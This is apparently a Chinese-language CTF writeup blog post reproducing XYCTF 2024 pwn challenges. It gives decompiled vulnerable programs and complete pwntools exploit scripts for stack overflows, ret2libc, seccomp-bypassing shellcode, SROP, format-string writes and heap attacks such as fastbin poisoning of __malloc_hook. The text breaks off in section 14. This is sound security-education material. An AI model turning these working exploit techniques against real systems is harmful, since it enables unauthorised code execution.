---
title: "XYCTF 2024 复现"
description: "XYCTF 2024 十六道 pwn 的复现记录：从签到 ret2libc 一路到 ptmalloc2 系列堆题。"
pubDate: 2025-04-10
category: wp
tags: [writeup]
---

## 1. hello_world
确实是签到题，ret2libc
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  init();
  printf("%s", "please input your name: ");
  read(0, buf, 0x48uLL);
  printf("Welcome to XYCTF! %s\n", buf);
  printf("%s", "please input your name: ");
  read(0, buf, 0x48uLL);
  printf("Welcome to XYCTF! %s\n", buf);
  return 0;
}
```
### 分析
第一次读入写 0x28 字节，用 `%s` 泄出 libc 地址；第二次读入正常溢出，打 ret2libc。

### exp
```python
from pwn import *

context.log_level = 'debug'
context.binary = './vuln'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')

io = process('./vuln')
gdb.attach(io, 'b $rebase(0x1233)')

# addr = 'xxxx'.split(':')
# io = remote(addr[0], int(addr[1]))

io.recvuntil(b'please input your name: ')
io.send(b'a'*0x27+b'x')

io.recvuntil(b'x')
libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x29d90
info('libc base: ' + hex(libc.address))

rdi = libc.address+0x2a3e5
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
info('rdi: ' + hex(rdi))
info('system: ' + hex(system))
info('binsh: ' + hex(binsh))

payload = b'a'*0x27 + b'x' +p64(rdi+1)+ p64(rdi)+p64(binsh) + p64(system)
io.send(payload)

io.interactive()
```

## 2. invisible_flag
shellcode + sandbox
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *addr; // [rsp+8h] [rbp-118h]

  init();
  addr = mmap((void *)0x114514000LL, 0x1000uLL, 7, 34, -1, 0LL);
  if ( addr == (void *)-1LL )
  {
    puts("ERROR");
    return 1;
  }
  else
  {
    puts("show your magic again");
    read(0, addr, 0x200uLL);
    sandbox();
    ((void (*)(void))addr)();
    return 0;
  }
}
```

### 分析
mmap 了 0x114514000 这样一个地址，然后读入 shellcode

sandbox
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x07 0x00 0x00000000  if (A == read) goto 0013
 0006: 0x15 0x06 0x00 0x00000001  if (A == write) goto 0013
 0007: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0013
 0008: 0x15 0x04 0x00 0x00000013  if (A == readv) goto 0013
 0009: 0x15 0x03 0x00 0x00000014  if (A == writev) goto 0013
 0010: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0013
 0011: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```
`ban` 掉不少常见系统调用，`open` 和 `execve` 都在名单里，所以只能走 `openat` + `sendfile` + `write` 这条读文件的路。
```
int openat(int dirfd, const char *pathname, int flags, mode_t mode);
dirfd: 表示目录的文件描述符。如果是 AT_FDCWD，则相对路径是从当前工作目录开始查找。
pathname: 要打开的文件路径,例如"/flag"。
flags: 文件打开的标志，类似于 open 的标志，如 O_RDONLY、O_WRONLY、O_RDWR、O_CREAT 等。
mode: 新文件的权限，仅当使用 O_CREAT 时才需要。

ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
out_fd: 目标文件描述符，通常是一个套接字文件描述符（socket），表示将数据发送到哪里。
in_fd: 源文件描述符，表示从哪里读取数据，通常是一个普通的文件。
offset: 指向偏移量的指针，表示从源文件的哪个位置开始读取。如果为 NULL，则从当前偏移量开始读取。
count: 需要传输的字节数。
```
### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

shellcode = '''
mov rdi,0xffffff9c
mov rax,0x67616c66
push rax
mov rsi, rsp
mov rdx, 0
mov rax,0x101
syscall

mov rdi,1
mov rsi, rax
xor rdx, rdx
mov r10, 0x40
mov rax, 0x28
syscall
'''

shellcode = asm(shellcode)

io = process('./vuln')
gdb.attach(io, 'b *0x114514000')

# addr = 'xxxxxx'.split(':')
# io = remote(addr[0], int(addr[1]))

io.sendline(shellcode)

io.interactive()
```

## 3. static_link
静态编译的程序，重点是找 gadget。
```C
__int64 vuln()
{
  _BYTE v1[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("static_link? ret2??");
  return read(0LL, v1, 256LL);
}
```

### 分析
就是普通栈溢出，但程序里找不到 `/bin/sh` 字符串，于是考虑栈迁移，迁到已知地址再写。

### exp
```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

io = process('./vuln')
gdb.attach(io, 'b *0x401846')

# addr = 'xxx'.split(':')
# io = remote(addr[0], int(addr[1]))

offset = 0x20
ret = 0x40101a
rdi = 0x401f1f
rsi = 0x409f8e
rdx = 0x451322
rax = 0x447fe7
syscall = 0x401cd4
datas = 0x4C50F0

payload = b'a' * offset
payload += p64(datas)
payload += p64(0x401826)
io.recvuntil(b'static_link? ret2??')
io.sendline(payload)

payload = b'/bin/sh\0' * 4
payload += p64(datas)
payload += p64(rdi)
payload += p64(datas - 0x10)
payload += p64(rsi)
payload += p64(0)
payload += p64(rdx)
payload += p64(0)
payload += p64(rax)
payload += p64(0x3b)
payload += p64(syscall)

io.recvuntil(b'static_link? ret2??')
io.sendline(payload)

io.interactive()
```

## 4. fmt
题目是格式化字符串，但入口不是 `printf`。
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf1[32]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init();
  printf("Welcome to xyctf, this is a gift: %p\n", &printf);
  read(0, buf1, 0x20uLL);
  __isoc99_scanf(buf1);
  printf("show your magic");
  return 0;
}
```
### 分析
拿到 libc 地址后，`scanf` 能在任意地址写任意内容；调一下会发现 libc 与 ld 的偏移固定，于是直接改写 ld 上的 `exit_hook`（`__rtld_lock_lock_recursive` / `__rtld_lock_unlock_recursive`）为 one_gadget。

### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc-2.31.so')

io = process('./vuln')
gdb.attach(io, 'b *0x40128D')

# addr = 'xxxx'.split(':')
# io = remote(addr[0], int(addr[1]))

io.recvuntil(b'Welcome to xyctf, this is a gift: 0x')
libc.address = int(io.recvline().strip(), 16) - 0x61cc0
info('libc base: ' + hex(libc.address))
# dl_fini = libc.symbols['_dl_fini']
# info('_dl_fini: ' + hex(dl_fini))
exit_hook = libc.address + 0x222f68

payload = b'%8$s\0\0\0\0'+p64(exit_hook)*3
io.send(payload)

io.sendline(p64(0x4012C2))

io.interactive()
```

## 5. malloc_flag
heap 基础题
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4;                // [rsp+0h] [rbp-130h] BYREF
  int v5;                // [rsp+4h] [rbp-12Ch]
  int v6;                // [rsp+8h] [rbp-128h]
  int i;                 // [rsp+Ch] [rbp-124h]
  FILE *stream;          // [rsp+10h] [rbp-120h]
  size_t n;              // [rsp+18h] [rbp-118h]
  void *ptr;             // [rsp+20h] [rbp-110h]
  size_t v11;            // [rsp+28h] [rbp-108h]
  size_t v12;            // [rsp+30h] [rbp-100h]
  void *v13;             // [rsp+38h] [rbp-F8h]
  char s2[64];           // [rsp+40h] [rbp-F0h] BYREF
  char src[64];          // [rsp+80h] [rbp-B0h] BYREF
  _BYTE v16[104];        // [rsp+C0h] [rbp-70h] BYREF
  unsigned __int64 v17;  // [rsp+128h] [rbp-8h]

  v17 = __readfsqword(0x28u);
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  stream = fopen("flag", "rb");
  if ( stream )
  {
    fseek(stream, 0LL, 2);
    n = ftell(stream);
    rewind(stream);
    ptr = malloc(0x100uLL);
    if ( ptr )
    {
      v11 = fread((char *)ptr + 16, 1uLL, n, stream);
      if ( v11 == n )
      {
        fclose(stream);
        free(ptr);
        v5 = 0;
        while ( 1 )
        {
          puts("1. 分配内存");
          puts("2. 释放内存");
          puts("3. 查看内存块");
          puts("4. 查看内存块内容");
          puts("5. 退出");
          printf("请输入选项: ");
          __isoc99_scanf("%d", &v4);
          switch ( v4 )
          {
            case 1:
              if ( numChunks > 9 )
              {
                puts("已达到最大内存块数，无法分配更多内存");
              }
              else
              {
                puts("请输入名字: ");
                __isoc99_scanf("%s", src);
                puts("请输入大小 (十进制或十六进制):");
                __isoc99_scanf("%s", v16);
                v12 = parseSize(v16);
                v13 = zmalloc(v12);
                if ( v13 )
                {
                  strncpy((char *)&allocatedChunks + 72 * numChunks, src, 0x32uLL);
                  *((_QWORD *)&unk_4098 + 9 * numChunks) = v12;
                  qword_40A0[9 * numChunks++] = v13;
                  printf("已分配内存块，名字：%s，", src);
                  printSize(v12);
                }
                else
                {
                  puts("内存分配失败");
                }
              }
              continue;
            case 2:
              puts("请输入要释放的名字: ");
              __isoc99_scanf("%s", s2);
              v5 = 0;
              v6 = 0;
              break;
            case 3:
              displayChunks();
              continue;
            case 4:
              puts("请输入要查看内容的内存块名字: ");
              __isoc99_scanf("%s", s2);
              showContent(s2);
              continue;
            case 5:
              exit(0);
            default:
              puts("无效选项，请重新输入");
              continue;
          }
          while ( 1 )
          {
            if ( v6 >= numChunks )
              goto LABEL_22;
            if ( !strcmp((const char *)&allocatedChunks + 72 * v6, s2) )
              break;
            ++v6;
          }
          zfree(qword_40A0[9 * v6]);
          printf("已释放内存块，名字：%s\n", s2);
          for ( i = v6; i < numChunks - 1; ++i )
          {
            strncpy((char *)&allocatedChunks + 72 * i, (const char *)&allocatedChunks + 72 * i + 72, 0x32uLL);
            *((_QWORD *)&unk_4098 + 9 * i) = *((_QWORD *)&unk_4098 + 9 * i + 9);
            qword_40A0[9 * i] = qword_40A0[9 * i + 9];
          }
          --numChunks;
          v5 = 1;
LABEL_22:
          if ( !v5 )
            printf(&byte_2090, s2);
        }
      }
      fwrite(&unk_20E7, 1uLL, 0x1CuLL, stderr);
      return 1;
    }
    else
    {
      fwrite(&unk_20D3, 1uLL, 0x13uLL, stderr);
      return 1;
    }
  }
  else
  {
    fprintf(stderr, &byte_20BC, v16);
    return 1;
  }
}
```

### 分析
一开始申请了一个大小为 256 的 chunk 写了 flag。`free` 之后它进了 tcache，同大小再 `malloc` 会原样拿回同一块，内容还在——直接 `display` 就是 flag。

### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

io = process('./vuln')
# addr = 'xxxxx'.split(':')
# io = remote(addr[0], int(addr[1]))

io.sendline(b'1')
io.sendline(b'flag')
io.sendline(b'256')
io.sendline(b'4')
io.sendline(b'flag')

io.interactive()
```

## 6. baby_gift
这题考汇编。
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  Menu();
  GetInfo();
  return 0;
}

void GetInfo()
{
  char s[32]; // [rsp+0h] [rbp-40h] BYREF
  char v1[32]; // [rsp+20h] [rbp-20h] BYREF

  printf("Your name:");
  putchar(10);
  fgets(s, 32, stdin);
  printf("Your passwd:");
  putchar(10);
  fgets(v1, 64, stdin);
  Gift();
}
```
```
.text:0000000000401219 ; void Gift()
.text:0000000000401219                 public Gift
.text:0000000000401219 Gift            proc near               ; CODE XREF: GetInfo+7F↓p
.text:0000000000401219
.text:0000000000401219 var_8           = qword ptr -8
.text:0000000000401219
.text:0000000000401219 ; __unwind {
.text:0000000000401219                 endbr64
.text:000000000040121D                 push    rbp
.text:000000000040121E                 mov     rbp, rsp
.text:0000000000401221                 mov     [rbp+var_8], rdi
.text:0000000000401225                 nop
.text:0000000000401226                 pop     rbp
.text:0000000000401227                 retn
.text:0000000000401227 ; } // starts at 401219
.text:0000000000401227 Gift            endp
```

### 分析
关键在于用栈溢出给 `rdi` 赋值，再跳到 `printf` 泄 libc，为后面的 ret2libc 铺路。

### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')
elf = ELF('./vuln')

ret = 0x40101a

io = process('./vuln')
gdb.attach(io, 'b *0x401283')

# addr = 'xxx'.split(':')
# io = remote(addr[0], int(addr[1]))

io.recvuntil(b'Your name:')
io.sendline(b'1')

io.recvuntil(b'Your passwd:')
payload = b'%3$p'
payload = payload.ljust(0x20, b'\x00')
# payload += p64(ret)
payload += p64(0x404200)
payload += p64(0x401274)
io.sendline(payload)

io.recvline()
libc.address = int(io.recvuntil(b'\n').strip(), 16) - 0x1147e2
info('libc base: ' + hex(libc.address))

payload = b''
payload = payload.ljust(0x20, b'\x00')
payload += p64(0x4041a0)
payload += p64(libc.address + 0xebc81)

io.sendline(payload)

io.interactive()
```

## 7. Intermittent
考的是 shellcode 的熟练度。
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 i;   // [rsp+0h] [rbp-120h]
  int *v5;              // [rsp+8h] [rbp-118h]
  _DWORD buf[66];       // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v7;  // [rsp+118h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v5 = mmap(0x114514000LL, 0x1000uLL, 7, 34, -1, 0LL);
  if ( v5 == -1LL )
  {
    puts("ERROR");
    return 1;
  }
  else
  {
    write(1, "show your magic: ", 0x11uLL);
    read(0, buf, 0x100uLL);
    for ( i = 0LL; i <= 2; ++i )
      v5[4 * i] = buf[i];
    (v5)();
    return 0;
  }
}
```

### 分析
每段 shellcode 只有四个字节：`pop` 和 `push` 各占一字节，末尾 `jmp` 接到下一段；再配合二次读入把完整 shellcode 铺开。

### exp
```python
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

shellcode = asm('''push rdx
                  pop rsi
                  jmp $+16
                  syscall
                  syscall''')
sh = asm('''mov rax,0x68732f6e69622f
            xor rdi,rdi
            push rax
            lea rdi,[rsp]
            xor rsi,rsi
            xor rdx,rdx
            mov rax,0x3b
            syscall
         ''')

io = process('./vuln')
gdb.attach(io, 'b *$rebase(0x135F)')

# addr = 'xxxx'.split(':')
# io = remote(addr[0], int(addr[1]))

io.sendline(shellcode)

# pause()

io.sendline(b'\x90'*0x14+sh)

io.interactive()
```

## 8. guestbook1
这题考数组越界，当时还不太熟。
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init();
  GuestBook();
  return 0;
}

void __cdecl GuestBook()
{
  int index;               // [rsp+Ch] [rbp-224h] BYREF
  char name[32][16];       // [rsp+10h] [rbp-220h] BYREF
  unsigned __int8 id[32];  // [rsp+210h] [rbp-20h] BYREF

  puts("Welcome to starRail.");
  puts("please enter your name and id");
  while ( 1 )
  {
    while ( 1 )
    {
      puts("index");
      scanf("%d", &index);
      if ( index <= 32 )
        break;             // 32
      puts("out of range");
    }
    if ( index < 0 )
      break;
    puts("name:");
    read(0, name[index], 0x10uLL);
    puts("id:");
    scanf("%hhu", &id[index]);
  }
  puts("Have a good time!");
}
```

### 分析
越界写覆盖 `rbp`，栈迁移后爆破低位跳到后门。

### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

while True:
    try:
        io = process('./pwn')
        gdb.attach(io, 'b *0x4012A8')
        # addr = 'xxxxx'.split(':')
        # io = remote(addr[0], int(addr[1]))

        for i in range(32):
            io.recvuntil(b'index')
            io.sendline(str(i).encode())

            io.recvuntil(b'name:')
            io.send(p64(0x40132B)*2)
            io.recvuntil(b'id:')
            io.sendline(b'0')

        io.recvuntil(b'index')
        io.sendline(b'32')

        io.recvuntil(b'name:')
        io.send(b'A' * 0x10)

        io.recvuntil(b'id:')
        io.sendline(b'0')

        io.recvuntil(b'index')
        io.sendline(b'-1')
        io.interactive()
        break
    except:
        io.close()

io.interactive()
```

## 9. fastfastfast
常规 UAF。
```C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned int choice;     // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4;     // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();              //   puts("1. create note");
                           //   puts("2. delete note");
                           //   puts("3. show content");
                           //   printf(">>> ");
      scanf("%u", &choice);
      if ( choice != 1 )
        break;
      create();
    }
    if ( choice == 2 )
    {
      delete();
    }
    else
    {
      if ( choice != 3 )
      {
        puts("Error choice");
        exit(0);
      }
      show();
    }
  }
}

void __cdecl create()
{
  unsigned int idxx;       // ebx
  unsigned int c;          // [rsp+4h] [rbp-1Ch] BYREF
  unsigned __int64 v2;     // [rsp+8h] [rbp-18h]

  v2 = __readfsqword(0x28u);
  puts("please input note idx");
  scanf("%u", &c);
  if ( c <= 0xF )
  {
    idxx = c;
    note_addr[idxx] = malloc(0x68uLL);
    puts("please input content");
    read(0, note_addr[c], 0x68uLL);
  }
  else
  {
    puts("idx error");
  }
}

void __cdecl delete()
{
  unsigned int idx;        // [rsp+Ch] [rbp-14h] BYREF
  unsigned __int64 v1;     // [rsp+18h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("please input note idx");
  scanf("%u", &idx);
  if ( idx <= 0xF )
    free(note_addr[idx]);  // uaf
  else
    puts("idx error");
}

void __cdecl show()
{
  unsigned int idx;        // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v1;     // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("please input note idx");
  scanf("%u", &idx);
  if ( idx <= 0xF )
  {
    if ( note_addr[idx] )
      write(1, note_addr[idx], 0x68uLL);
    else
      puts("note is null");
  }
  else
  {
    puts("idx error");
  }
}
```
### 分析
标准 UAF：打 fastbin attack，劫持 `__malloc_hook`。

### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc-2.31.so')
elf = ELF('./vuln')

io = process(elf.path)
# gdb.attach(io, 'b *0x40154C')

# addr = 'xxxxxx'.split(':')
# io = remote(addr[0], int(addr[1]))

def cmd(s):
    io.sendlineafter(b'>>> ', s)

def add(idx, content):
    cmd(b'1')
    io.sendlineafter(b'please input note idx', str(idx).encode())
    io.sendafter(b'please input content', content)

def delete(idx):
    cmd(b'2')
    io.sendlineafter(b'please input note idx', str(idx).encode())

def show(idx):
    cmd(b'3')
    io.sendlineafter(b'please input note idx', str(idx).encode())

for i in range(12):
    add(i, b'x' * 0x20)

for i in range(11):
    delete(i)

cmd(b'1')
io.sendlineafter(b'please input note idx', str(0xcafebeef).encode()*0x100)

show(7)
libc.address = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ecd90
info('libc.address:'+hex(libc.address))
one = libc.address + 0xe3b31
info('one:'+hex(one))
malloc_hook = libc.symbols['__malloc_hook']

for i in range(11):
    add(i, b'x' * 0x20)

for i in range(7):
    delete(i)

info('plz check some things')

delete(7)
delete(8)
delete(7)

for i in range(7):
    add(i, b'x' * 0x20)

info('plz check some things')

add(7, p64(malloc_hook-0x23))
add(8, b'x')
add(9, b'x')
add(7, b'a'*0x23 + p64(one))

cmd(b'1')
io.sendlineafter(b'please input note idx', b'1')

io.interactive()
```

## 10. simple_srop
程序很短。
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  init(argc, argv, envp);
  read(0, buf, 0x200uLL);
  return 0;
}

__int64 init()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  return sandbox();
}

__int64 sandbox()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = seccomp_init(2147418112LL);
  seccomp_rule_add(v1, 0LL, 59LL, 0LL);
  seccomp_rule_add(v1, 0LL, 322LL, 0LL);
  return seccomp_load(v1);
}
```
### 分析
先用 SROP 做栈迁移，再用 SROP 打 ORW。sigreturn frame 的好处是一次把所有寄存器摆好，不用一个个凑 `pop rdi; ret` 这类 gadget。

### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

io = process('./vuln')
# gdb.attach(io, 'b *0x4012CF')

# addr = 'xxxxxx'.split(':')
# io = remote(addr[0], int(addr[1]))

offset = 0x28
signrt = 0x401296
syscall = 0x40129D
ret = 0x4012D5

sign = SigreturnFrame()
sign.rax = 0
sign.rdi = 0
sign.rsi = 0x404200
sign.rdx = 0x800
sign.rip = syscall
sign.rsp = 0x404208

io.sendline(b'a'*offset + p64(signrt) + bytes(sign))

signopen = SigreturnFrame()
signopen.rax = 2
signopen.rdi = 0x404200
signopen.rsi = 0
signopen.rip = syscall
signopen.rsp = 0x404308

signread = SigreturnFrame()
signread.rax = 0
signread.rdi = 3
signread.rsi = 0x404100
signread.rdx = 0x3c
signread.rip = syscall
signread.rsp = 0x404408

signwrite = SigreturnFrame()
signwrite.rax = 1
signwrite.rdi = 1
signwrite.rsi = 0x404100
signwrite.rdx = 0x3c
signwrite.rip = syscall
signwrite.rsp = 0

io.sendline(b'flag\0\0\0\0' + p64(signrt) + bytes(signopen) + p64(signrt) +
            bytes(signread) + p64(signrt) + bytes(signwrite))

io.interactive()
```

## 11. one_byte
off-by-one 加 UAF。
```C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int choice;                    // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();                    //   puts("Welcome to XYCTF");
                                 //   puts("[1] add_chunk()");
                                 //   puts("[2] delete_chunk()");
                                 //   puts("[3] view_chunk()");
                                 //   puts("[4] edit_chunk()");
                                 //   puts("[5] exit()");
                                 //   return printf(">>> ");
      choice = get_choice();
      if ( choice != 1 )
        break;
      add_chunk();
    }
    switch ( choice )
    {
      case 2:
        delete_chunk();
        break;
      case 3:
        view_chunk();
        break;
      case 4:
        edit_chunk();
        break;
      case 5:
        puts("[-] exit()");
        exit(0);
      default:
        puts("[-] Error choice!");
        break;
    }
  }
}

unsigned __int64 add_chunk()
{
  unsigned int v0;               // ebx
  unsigned int idx;              // [rsp+0h] [rbp-20h] BYREF
  int size;                      // [rsp+4h] [rbp-1Ch] BYREF
  unsigned __int64 v4;           // [rsp+8h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  printf("[?] please input chunk_idx: ");
  scanf("%u", &idx);
  if ( idx <= 0x1F )
  {
    if ( inused_list[idx] )
    {
      puts("[-] Chunk inuse!");
    }
    else
    {
      printf("[?] Enter chunk size: ");
      scanf("%u", &size);
      if ( size <= 0x200 )
      {
        v0 = idx;
        chunk_list[v0] = malloc(size);
        size_list[idx] = size;
        inused_list[idx] = 1;
      }
      else
      {
        puts("[-] too big");
      }
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
  return __readfsqword(0x28u) ^ v4;
}

unsigned __int64 delete_chunk()
{
  unsigned int v1;               // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2;           // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("[?] please input chunk_idx: ");
  scanf("%u", &v1);
  if ( v1 <= 0x1F )
  {
    if ( inused_list[v1] )
    {
      if ( chunk_list[v1] )
      {
        free(chunk_list[v1]);    // uaf
        inused_list[v1] = 0;
      }
      else
      {
        puts("[-] No such chunk!");
      }
    }
    else
    {
      puts("[-] Chunk not inuse!");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
  return __readfsqword(0x28u) ^ v2;
}

unsigned __int64 view_chunk()
{
  unsigned int v1;               // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2;           // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("[?] please input chunk_idx: ");
  scanf("%u", &v1);
  if ( v1 <= 0x1F )
  {
    if ( inused_list[v1] )
    {
      if ( chunk_list[v1] )
        write(1, chunk_list[v1], size_list[v1]);
      else
        puts("[-] No such chunk!");
    }
    else
    {
      puts("[-] Chunk not inuse!");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
  return __readfsqword(0x28u) ^ v2;
}

unsigned __int64 edit_chunk()
{
  unsigned int v1;               // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2;           // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("[?] please input chunk_idx: ");
  scanf("%u", &v1);
  if ( v1 <= 0x1F )
  {
    if ( inused_list[v1] )
    {
      if ( chunk_list[v1] )
        read_data(chunk_list[v1], size_list[v1]);
      else
        puts("[-] No such chunk!");
    }
    else
    {
      puts("[-] Chunk not inuse!");
    }
  }
  else
  {
    puts("[-] Chunk limit exceeded!");
  }
  return __readfsqword(0x28u) ^ v2;
}

ssize_t __fastcall read_data(void *a1, int a2)
{
  return read(0, a1, (a2 + 1));  // off by one
}
```

### 分析
off-by-one + UAF：先填满 `tcache`，再打 fastbin attack 改 `__malloc_hook`。

### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')

io = process('./vuln')
# gdb.attach(io, 'b *$rebase(0x181C)')
# addr = 'xxxxxx'.split(':')
# io = remote(addr[0], int(addr[1]))

def cmd(c: int):
    io.sendlineafter(b'>>> ', str(c).encode())

def add(idx: int, size: int):
    cmd(1)
    io.sendlineafter(b'[?] please input chunk_idx: ', str(idx).encode())
    io.sendlineafter(b'[?] Enter chunk size: ', str(size).encode())

def delete(idx: int):
    cmd(2)
    io.sendlineafter(b'[?] please input chunk_idx: ', str(idx).encode())

def show(idx: int):
    cmd(3)
    io.sendlineafter(b'[?] please input chunk_idx: ', str(idx).encode())

def edit(idx: int, data: bytes):
    cmd(4)
    io.sendlineafter(b'[?] please input chunk_idx: ', str(idx).encode())
    io.send(data)

for i in range(7):
    add(i, 0xb0)

add(7, 0x18)
add(8, 0x20)
add(9, 0x80)
add(10, 0x20)

for i in range(7):
    delete(i)

extend = b'a'*0x10
extend += p64(0) + p8(0xc1)
edit(7, extend)
delete(8)

add(8, 0x20)
show(9)
libc.address = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ecbe0
info('libc.address: ' + hex(libc.address))
malloc_hook = libc.symbols['__malloc_hook']
info('malloc_hook: ' + hex(malloc_hook))
one = libc.address + 0xe3b01

info('plz check some things')

add(11, 0x80)
add(12, 0x80)
add(13, 0x80)

delete(13)
delete(9)
delete(12)

payload = p64(malloc_hook)
edit(11, payload)

add(14, 0x80)
add(15, 0x80)
add(16, 0x80)

payload = p64(one)
info('plz check the one gadget:'+ hex(one))
edit(16,payload)

add(17, 0x80)

io.interactive()
```

## 12. EZ1.0
第一次做 MIPS。
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init_0(argc, argv, envp);
  puts("welcome XYCTF mips world");
  vuln();
  return 0;
}

int vuln()
{
  _BYTE v1[64]; // [sp+18h] [+18h] BYREF

  read(0, v1, 256);
  return 0;
}
```
### 分析
静态编译的 MIPS 程序，很小，就是普通栈溢出。但 MIPS 上找不到 `pop rdi; ret` 这类 gadget——好在它的段都可执行，可以直接写 shellcode。

### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'mips'

shellcode = asm('''li $t6, 0x6e69622f
li $t7,0x68732f
sw $t6, 0xc($sp)
sw $t7, 0x10($sp)
sw $zero, 0x14($sp)

la $a0, 0xc($sp)
li $a1, 0
li $a2, 0

li $v0, 4011
syscall
nop
''')

# io = process(['qemu-mipsel-static','-g' ,'1234', './mips'])
io = process(['qemu-mipsel-static', './mips'])

# addr = 'xxxxxx'.split(':')
# io = remote(addr[0], int(addr[1]))

payload = b'a' * 0x40
payload += p32(0x492900)
payload += p32(0x400860)

io.sendline(payload)

pause()

payload = b'a' * 0x44
payload += p32(0x492900+0x60)
payload += shellcode

io.sendline(payload)

io.interactive()
```

## 13. EZ2.0
这次是 ARM。
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init_0(argc, argv, envp);
  puts("welcome XYCTF arm world");
  vuln();
  return 0;
}

int vuln()
{
  _BYTE v1[68]; // [sp+0h] [bp-44h] BYREF

  read(0, v1, 256);
  return 0;
}
```
### 分析
同样静态编译、程序很小，不过这题能找到 gadget，可以打 ROP。

### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'arm'

# io = process(['qemu-arm-static', '-g', '1234', './arm'])
io = process(['qemu-arm-static', './arm'])

# addr = 'xxxxxx'.split(':')
# io = remote(addr[0], int(addr[1]))

binsh = 0x8A090
pop_r7 = 0x27d78
pop_r0 = 0x5f73c
pop_r1 = 0x5f824
mov_r2 = 0x4dd04
svc = 0x102B4

payload = b'a'*68
payload += p32(pop_r7)
payload += p32(0xb)
payload += p32(pop_r1)
payload += p32(0)
payload += p32(mov_r2)
payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(pop_r0)
payload += p32(binsh)
payload += p32(svc)

pause()

io.send(payload)

io.interactive()
```

## 14. ptmalloc2 it's myheap
```C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int choice;             // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
